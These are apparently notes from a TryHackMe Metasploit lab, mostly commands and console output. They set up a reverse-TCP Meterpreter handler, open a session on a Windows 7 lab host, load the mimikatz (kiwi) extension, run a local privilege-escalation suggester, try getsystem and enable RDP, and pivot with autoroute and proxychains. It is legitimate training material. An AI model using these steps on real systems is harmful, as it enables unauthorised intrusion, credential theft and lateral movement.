
# RP: Metasploit
https://tryhackme.com/room/rpmetasploit

First things first, we need to initialize the database! Let's do that now with the command: 

```sh
kali@kali:~$ sudo msfdb init
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

```sh
msfconsole
```

```
msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
```


10.10.19.50

db_nmap -sV 10.10.19.50


search multi/handler
use 6
set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.9.28.128
set RHOST 10.10.19.50


Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.28.128:4444 -> 10.10.19.50:49209 (10.10.19.50)

eterpreter > migrate spoolsv.exe
[-] Not a PID: spoolsv.exe

meterpreter > migrate 1348
[*] Migrating from 2264 to 1348...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)

meterpreter > whoami
[-] Unknown command: whoami.

meterpreter > uuid
[+] UUID: 0eed7d0565659003/x86=1/windows=1/2020-04-18T21:53:37Z

meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege


meterpreter > run post/windows/gather/checkvm

[*] Checking if DARK-PC is a Virtual Machine .....
[+] This is a Xen Virtual Machine

meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.19.50 - Collecting local exploits for x86/windows...
[*] 10.10.19.50 - 30 exploit checks are being tried...
[+] 10.10.19.50 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.19.50 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.19.50 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.19.50 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.19.50 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.19.50 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.19.50 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.19.50 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

eterpreter > run post/windows/manage/enable_rdp

[-] Insufficient privileges, Remote Desktop Service was not modified
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20200418180534_default_10.10.19.50_host.windows.cle_787296.txt

meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)

meterpreter > run autoroute -h
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module


run autoroute -s 172.18.1.0 -n 255.255.255.0



proxychains bash

socks5   127.0.0.1   1080



